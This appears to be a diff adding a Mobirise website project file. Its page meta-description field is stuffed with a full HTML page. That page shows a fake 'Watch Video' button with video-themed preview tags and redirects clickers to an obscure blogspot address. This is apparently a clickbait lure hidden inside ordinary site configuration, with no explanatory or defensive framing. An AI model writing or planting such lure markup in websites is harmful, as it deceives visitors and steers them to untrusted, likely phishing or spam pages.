@@ -1,0 +1,50 @@
+{
+  "settings": {
+    "name": "Site-08-01_1417",
+    "currentPage": "index.html",
+    "theme": {
+      "name": "mobirise4",
+      "title": "Mobirise 4",
+      "styling": {
+        "primaryColor": "#149dcc",
+        "secondaryColor": "#ff3366",
+        "successColor": "#F7ED4A",
+        "infoColor": "#82786E",
+        "warningColor": "#879A9F",
+        "dangerColor": "#B1A374",
+        "mainFont": "Rubik",
+        "display1Font": "Rubik",
+        "display1Size": 4.25,
+        "display2Font": "Rubik",
+        "display2Size": 3,
+        "display5Font": "Rubik",
+        "display5Size": 1.5,
+        "display7Font": "Rubik",
+        "display7Size": 1,
+        "display4Font": "Rubik",
+        "display4Size": 1,
+        "isRoundedButtons": true,
+        "isAnimatedOnScroll": false,
+        "isScrollToTopButton": false
+      }
+    },
+    "path": "@PROJECT_PATH@",
+    "versionFirst": "4.10.6",
+    "siteFonts": [],
+    "uniqCompNum": 0,
+    "versionPublish": "4.10.6"
+  },
+  "pages": {
+    "index.html": {
+      "settings": {
+        "main": true,
+        "title": "Home",
+        "meta_descr": "<html> <head> <meta property=\"og:title\" content=\"Video\" /> <meta property=\"og:image\" content=\"https://i.postimg.cc/nV919WH0/800px-COLOURBOX14895857.jpg\" /> </head> <body> <style> .button { background-color: #cf1f1f ; border: none; color: white; padding: 35px 62px; text-align: center; text-decoration: none; display: inline-block; font-size: 70px; margin: 4px 2px; cursor: pointer; } </style> </br> </br> </br> </br> </br> </br> </br> </br> </br> </br> </br> </br> </br> </br> </br> </br> </br> </br> <center><p id=\"demo\"> </p></center> <script type=\"text/javascript\"> function generateRandomString(iLen) { var sRnd = ''; var sChrs = \"abcdefghiklmnopqrstuvwxyz\"; for (var i = 0; i < iLen; i++) { var randomPoz = Math.floor(Math.random() * sChrs.length); sRnd += sChrs.substring(randomPoz, randomPoz + 1); } return sRnd; } function getUrlVars() { var vars = {}; var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) { vars[key] = value; }); return vars; } var id = getUrlVars()[\"id\"]; var name = getUrlVars()[\"name\"]; function visitPage(){ window.location = \"https://ss-f-sf-sf-fs-wwff-s-fs-fs-fsww.blogspot.com/\"; } if (screen.width <= 720) { document.getElementById(\"demo\").innerHTML =\"<h1><button class=button onclick=visitPage();> Watch Video</button></h1>\" } else { document.getElementById(\"demo\").innerHTML =\"<h1><button class=button onclick=visitPage();> Watch Video</button></h1>\" } </script> <div style=\"display:none\"> <img src=''/> </div> </body> </html>",
+        "header_custom": "",
+        "footer_custom": "",
+        "html_before": ""
+      },
+      "components": []
+    }
+  }
+}
